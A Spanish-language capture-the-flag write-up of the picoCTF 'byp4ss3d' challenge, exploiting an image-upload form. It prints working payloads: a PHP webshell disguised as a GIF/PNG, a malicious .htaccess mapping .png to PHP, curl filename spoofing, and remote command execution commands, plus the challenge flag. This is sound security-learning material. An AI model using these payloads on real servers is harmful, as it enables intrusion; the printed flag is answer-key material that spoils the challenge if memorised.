**Área:** Explotación web **Dificultad:** Medio **Plataforma:** picoMini de CMU-África (picoCTF) **Link del reto o Nombre:** byp4ss3d **Resuelto por:** Diego **Fecha:** - **Tiempo que tardé:** -

---

## ¿Qué pista/detalle me hizo saber por dónde ir?

El enunciado decía que el portal solo debería aceptar imágenes, pero preguntaba "¿son suficientes los filtros?". Las dos pistas daban la receta completa:

1. "Se puede engañar a Apache para que ejecute archivos que no sean PHP como PHP con un archivo `.htaccess`"
2. "Intenta cargar más de un archivo"

Eso apuntaba a un ataque clásico de **subida de archivos sin restricción (unrestricted file upload)**: subir un `.htaccess` que reconfigure Apache para tratar `.png` como PHP, y subir un webshell disfrazado de imagen.

## Herramienta(s) que usé

`curl` (para interactuar directo con el formulario de subida sin usar el navegador), y lectura del HTML/código fuente de la página para identificar el nombre real del campo del formulario.

## Pasos (solo lo esencial, tipo lista)

- Revisé el HTML del formulario (`<input type="file" name="image">`) para saber el nombre exacto del campo que espera `upload.php`
- Creé un `.htaccess` con la directiva `AddType application/x-httpd-php .png` — le dice a Apache que ejecute cualquier `.png` de esa carpeta como si fuera PHP
- Creé un webshell mínimo (`shell.png`) con la firma `GIF89a` (para simular una imagen real) seguida de código PHP: `<?php system($_GET['cmd']); ?>`
- Subí `shell.png` normal por el campo `image` — se guardó con el nombre intacto, sin sanitizar
- Intenté subir el `.htaccess` de varias formas (mismo campo repetido, campo con nombre distinto, `image[]`) sin éxito — el backend solo procesaba el campo `image` tal cual, sin importar el nombre real del segundo archivo
- La solución fue usar el parámetro `filename` de `curl` para **disfrazar el nombre del archivo en la petición HTTP**, subiendo un archivo local llamado `htaccess.png` pero diciéndole al servidor que su nombre real era `.htaccess` — el servidor lo guardó literalmente como `.htaccess`, saltándose cualquier chequeo de extensión basado en el nombre del archivo local
- Con ambos archivos en el servidor (`images/shell.png` y `images/.htaccess`), Apache empezó a interpretar `shell.png` como PHP
- Confirmé ejecución de comandos visitando `images/shell.png?cmd=id` → devolvió `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- Busqué la flag con `find / -iname "*flag*"` y la encontré en `/var/www/flag.txt`
- La leí con `cat` a través del mismo webshell

## Comando(s) o payload clave (si aplica)

```bash
# .htaccess malicioso
echo 'AddType application/x-httpd-php .png' > .htaccess

# webshell disfrazado de imagen
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>\n' > shell.png

# 1. Subir el webshell (nombre intacto)
curl -F "image=@shell.png" http://<host>:<puerto>/upload.php

# 2. Subir el .htaccess disfrazando el nombre real con curl
cp .htaccess htaccess.png
curl -F "image=@htaccess.png;filename=.htaccess" http://<host>:<puerto>/upload.php

# 3. Confirmar RCE
curl "http://<host>:<puerto>/images/shell.png?cmd=id"

# 4. Ubicar y leer la flag
curl "http://<host>:<puerto>/images/shell.png?cmd=find+/+-iname+%22*flag*%22+2>/dev/null"
curl "http://<host>:<puerto>/images/shell.png?cmd=cat+/var/www/flag.txt"
```

## Flag

`picoCTF{s3rv3r_byp4ss_9b8609cc}`

## ¿Qué aprendí / qué usaría de nuevo?

Un filtro de subida de archivos que solo valida la **extensión del nombre** (sin revisar el contenido real ni bloquear archivos de configuración como `.htaccess`) es insuficiente — Apache lee `.htaccess` de cualquier carpeta a la que tenga acceso, así que subir uno ahí reconfigura el comportamiento del servidor para esa carpeta específica. También aprendí el truco de `curl -F "campo=@archivo_local;filename=nombre_falso"` para desacoplar el nombre del archivo en disco del nombre que el servidor recibe en la petición HTTP — útil cuando el backend no sanea bien ese campo.

## ¿Me trabé en algo? ¿Cómo lo destrabé?

Sí, bastante — costó encontrar la forma correcta de subir el `.htaccess`. Probé: mismo campo repetido (PHP solo se queda con el último archivo), un segundo campo con nombre distinto (el backend lo ignoraba en silencio), y `image[]` como array (rompió el script con un error 500, revelando que no soporta arrays). Lo que finalmente funcionó fue mantener el campo `image` de siempre, pero renombrar el archivo a nivel de la propia petición HTTP con `;filename=.htaccess` en `curl` — el servidor confía en ese nombre declarado, no en el nombre real del archivo en mi disco.

---

